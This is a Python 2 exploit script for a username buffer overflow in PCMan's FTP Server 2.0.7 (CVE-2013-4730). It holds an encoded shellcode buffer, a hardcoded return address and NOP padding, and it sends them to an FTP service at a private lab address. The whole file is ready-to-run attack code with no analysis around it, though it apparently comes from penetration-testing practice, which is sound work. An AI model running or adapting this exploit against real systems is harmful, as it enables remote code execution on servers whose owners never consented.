#!/usr/bin/python

import socket

ret = "\x68\x97\xe7\x7c"
buf =  ""
buf += "\xdb\xd8\xba\xd0\xbb\xeb\xd7\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x47\x83\xc7\x04\x31\x57\x14\x03\x57\xc4\x59"
buf += "\x1e\x2b\x0c\x1f\xe1\xd4\xcc\x40\x6b\x31\xfd\x40\x0f"
buf += "\x31\xad\x70\x5b\x17\x41\xfa\x09\x8c\xd2\x8e\x85\xa3"
buf += "\x53\x24\xf0\x8a\x64\x15\xc0\x8d\xe6\x64\x15\x6e\xd7"
buf += "\xa6\x68\x6f\x10\xda\x81\x3d\xc9\x90\x34\xd2\x7e\xec"
buf += "\x84\x59\xcc\xe0\x8c\xbe\x84\x03\xbc\x10\x9f\x5d\x1e"
buf += "\x92\x4c\xd6\x17\x8c\x91\xd3\xee\x27\x61\xaf\xf0\xe1"
buf += "\xb8\x50\x5e\xcc\x75\xa3\x9e\x08\xb1\x5c\xd5\x60\xc2"
buf += "\xe1\xee\xb6\xb9\x3d\x7a\x2d\x19\xb5\xdc\x89\x98\x1a"
buf += "\xba\x5a\x96\xd7\xc8\x05\xba\xe6\x1d\x3e\xc6\x63\xa0"
buf += "\x91\x4f\x37\x87\x35\x14\xe3\xa6\x6c\xf0\x42\xd6\x6f"
buf += "\x5b\x3a\x72\xfb\x71\x2f\x0f\xa6\x1d\x9c\x22\x59\xdd"
buf += "\x8a\x35\x2a\xef\x15\xee\xa4\x43\xdd\x28\x32\xa4\xf4"
buf += "\x8d\xac\x5b\xf7\xed\xe5\x9f\xa3\xbd\x9d\x36\xcc\x55"
buf += "\x5e\xb7\x19\xf9\x0e\x17\xf2\xba\xfe\xd7\xa2\x52\x15"
buf += "\xd8\x9d\x43\x16\x33\xb6\xee\xec\xd3\x79\x46\xd6\x22"
buf += "\x12\x95\x27\x35\xbe\x10\xc1\x5f\x2e\x75\x59\xf7\xd7"
buf += "\xdc\x11\x66\x17\xcb\x5f\xa8\x93\xf8\xa0\x66\x54\x74"
buf += "\xb3\x1e\x94\xc3\xe9\x88\xab\xf9\x84\x34\x3e\x06\x0f"
buf += "\x63\xd6\x04\x76\x43\x79\xf6\x5d\xd8\xb0\x62\x1e\xb6"
buf += "\xbc\x62\x9e\x46\xeb\xe8\x9e\x2e\x4b\x49\xcd\x4b\x94"
buf += "\x44\x61\xc0\x01\x67\xd0\xb5\x82\x0f\xde\xe0\xe5\x8f"
buf += "\x21\xc7\xf7\xec\xf7\x21\x82\x1c\xc4"
payload = "\x90"*2009 + ret + "\x90"*100 +buf

def main():
    s = socket.socket(
            socket.AF_INET,socket.SOCK_STREAM)

    s.connect(('192.168.56.101',21))
    s.send(payload)
    buf = s.recv(1024) #banner
    print buf
    buf = s.recv(1024) #username 
    print buf
    s.send("password")
    buf = s.recv(1024)
    print buf

if __name__ == '__main__':
    print "PCMan's FTP Server 2.0.7 Username Buffer Overflow Exploit [CVE: 2013-4730]"
    main()
